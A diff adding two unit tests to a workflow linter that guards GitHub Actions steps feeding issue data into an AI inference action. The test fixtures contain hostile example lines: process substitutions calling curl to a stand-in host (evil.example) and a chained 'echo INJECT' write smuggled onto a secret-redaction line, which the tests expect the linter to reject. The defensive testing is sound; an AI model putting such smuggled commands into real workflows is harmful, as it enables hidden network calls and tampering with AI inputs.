@@ -823,6 +823,45 @@ class PromptsLintTest(unittest.TestCase):
             errors = check_prompts.lint_workflow(path)
             self.assertTrue(any("chained" in e for e in errors))
 
+    def test_workflow_process_substitution_on_producer_line_fails(self):
+        # github-advanced-security on #1118: >(...) / <(...) process
+        # substitution runs a hidden command alongside the producer —
+        # fail closed even on an otherwise compliant gh | tee line.
+        for collect in (
+            'gh issue list --repo "$GITHUB_REPOSITORY" --json number,labels,url '
+            '| tee "$RUNNER_TEMP/open-issues.json" > >(curl -s https://evil.example)',
+            'cat <(curl -s https://example.com/x) > "$RUNNER_TEMP/open-issues.json"',
+        ):
+            with tempfile.TemporaryDirectory() as tmp:
+                wf = self._inference_workflow(collect)
+                path = self._workflow(Path(tmp), "wf.yml", wf)
+                errors = check_prompts.lint_workflow(path)
+                self.assertTrue(
+                    any("chained" in e for e in errors),
+                    f"expected chained/process-substitution rejection for: {collect}",
+                )
+
+    def test_workflow_chained_write_on_redact_line_fails(self):
+        # github-advanced-security on #1118: the redact_secrets.py exemption
+        # applies only to a single simple command — chaining an unverified
+        # write onto the redaction line must fail closed.
+        with tempfile.TemporaryDirectory() as tmp:
+            wf = """jobs:
+  audit:
+    steps:
+      - run: |
+          gh issue list --repo "$GITHUB_REPOSITORY" --json number,labels,url > "$RUNNER_TEMP/open-issues.json"
+          python3 scripts/redact_secrets.py --strict "$RUNNER_TEMP/open-issues.json" "$RUNNER_TEMP/open-issues.json"; echo INJECT >> "$RUNNER_TEMP/open-issues.json"
+      - uses: actions/ai-inference@v3
+        with:
+          prompt-file: .github/prompts/x.prompt.yml
+          file_input: |
+            issues: ${{ runner.temp }}/open-issues.json
+"""
+            path = self._workflow(Path(tmp), "wf.yml", wf)
+            errors = check_prompts.lint_workflow(path)
+            self.assertTrue(any("chained" in e for e in errors))
+
 
 if __name__ == "__main__":
     unittest.main()
